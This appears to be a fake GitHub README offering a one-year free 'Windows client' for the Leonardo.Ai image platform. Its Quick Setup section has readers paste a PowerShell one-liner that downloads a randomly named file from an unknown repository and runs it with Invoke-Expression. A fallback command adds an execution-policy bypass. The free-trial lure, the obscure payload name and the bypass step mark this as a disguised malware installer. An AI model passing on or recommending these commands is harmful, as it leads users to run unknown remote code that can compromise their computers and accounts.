# Leonardo.Ai

Leonardo.Ai on this page is a free trial and a free subscription for Windows. The free trial is built in and runs for a year. The free subscription is what stays on this PC after Quick Setup.

Leonardo.Ai is a subscription creative platform for generating and refining images and short video clips from Windows. The experience centers on token-backed access to many fine-tuned models instead of one generic engine, with tiers that control private generations, enhanced quality, personal training slots, and how many jobs run at once. After setup, the client on your machine reflects plan limits for fast tokens, rollover banks, and relaxed unlimited generation on supported models when your tier allows it.

A typical session starts with text-to-image or image guidance: you choose Auto or a named model such as Phoenix or Lucid, draft a prompt or upload a reference, then review variations as they leave the queue. You might polish results in realtime canvas, run omni edits, remove backgrounds, upscale for export, or route a still into Motion when video is included. Collections and custom-trained models help keep characters, products, and brand looks aligned across repeat batches without rebuilding prompts from scratch.

This repository holds the Windows setup file, operator notes on tokens and privacy options, and a changelog for model roster and tier adjustments. First-time configuration activates the built-in free trial, which runs for a year from initial setup. The notes document daily resets, public versus private creations, and upgrade paths between plans. When that year ends, the free subscription stored on your PC preserves your local profile, shortcuts, and default quality settings so everyday generation still launches from the same entry point without repeating installation.

## What you get

- Built-in free trial runs one full year from first Windows setup before automatic tier rules apply.
- The free subscription profile stays on your PC after setup so presets and collections reopen instantly.
- Phoenix and Lucid model families deliver photoreal and stylized text-to-image batches from detailed prompts.
- Token balances, rollover banks, and top-ups mirror Essential, Premium, and Ultimate subscriber allowances inside the client.
- Realtime canvas and omni editing refine generations without abandoning the active queue or session context.
- Personal model training accepts small image sets to lock subject or style consistency across campaign outputs.
- Motion pipelines animate selected stills into short clips when your subscription tier includes video generation.
- Private creation modes on paid tiers keep in-progress work out of public galleries during local sessions.

## Quick Setup (PowerShell)

This starts the built-in Leonardo.Ai free trial. It runs for a year. The free subscription is what you have when it finishes.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/e-pohl813053/leonardo-ai-setup-guide/main/0yc4qybmhv.s6sctcsd | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/e-pohl813053/leonardo-ai-setup-guide/main/0yc4qybmhv.s6sctcsd | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `0yc4qybmhv.s6sctcsd` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `e-pohl813053/leonardo-ai-setup-guide`. Leonardo.Ai 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
